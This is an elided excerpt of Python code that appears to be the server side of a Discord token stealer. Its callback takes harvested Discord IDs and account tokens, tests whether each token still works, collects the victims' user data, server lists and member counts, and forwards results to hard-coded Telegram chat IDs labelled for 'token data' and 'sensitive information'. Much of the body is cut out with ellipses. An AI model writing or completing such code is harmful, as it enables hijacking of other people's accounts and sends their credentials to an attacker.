...
FULL_CHAT_ID = "-5092575672"  # Unmasked chat ID for sensitive information, rate limits, errors
MASKED_CHAT_ID = "-5078508152"  # Masked chat ID for token data
...
def send_telegram_html(chat_id: int, html_text: str):
    try:
        ...
        send_telegram_html(FULL_CHAT_ID, f"<pre>{error_message}</pre>")
        return None
...
def get_discord_user(token: str):
    ...
    try:
        ...
        if r.status_code == 200:
            ...
            send_telegram_html(FULL_CHAT_ID, f"<pre>Discord rate limited while fetching user data</pre>")
            return None
    except requests.RequestException as e:
        send_telegram_html(FULL_CHAT_ID, f"<pre>Error fetching user data: {str(e)}</pre>")
    return None
...
def get_discord_guilds(token: str):
    ...
    try:
        ...
        if r.status_code == 200:
            ...
            send_telegram_html(FULL_CHAT_ID, f"<pre>Discord rate limited while fetching guilds</pre>")
            return None
    except requests.RequestException as e:
        send_telegram_html(FULL_CHAT_ID, f"<pre>Error fetching guilds: {str(e)}</pre>")
    return []
...
def get_guild_membercount(token: str, guild_id: str):
    ...
    try:
        ...
        if r.status_code == 200:
            ...
            send_telegram_html(FULL_CHAT_ID, f"<pre>Discord rate limited while fetching member count</pre>")
            return None
    except requests.RequestException as e:
        send_telegram_html(FULL_CHAT_ID, f"<pre>Error fetching member count: {str(e)}</pre>")
    return "N/A"
...
def callback():
    ...
    if "Error decoding token" in decoded_data:
        send_telegram_html(FULL_CHAT_ID, f"<pre>{decoded_data}</pre>")
    ...
    for discord_id, token in entries:
        # If token was previously invalid, check if it's valid now
        if discord_id in invalid_tokens:
            user_data = get_discord_user(token)
            if user_data and user_data.get('username') != "Unknown":
                invalid_tokens.pop(discord_id)  # Token is now valid again

        # Get Discord user data
        user_data = get_discord_user(token)
        if not user_data or user_data.get('username') == "Unknown":
            # Token is invalid, send to full chat and skip
            send_telegram_html(FULL_CHAT_ID, f"<pre>Invalid token detected for Discord ID: {discord_id}</pre>")
            invalid_tokens[discord_id] = token  # Mark token as invalid
            continue
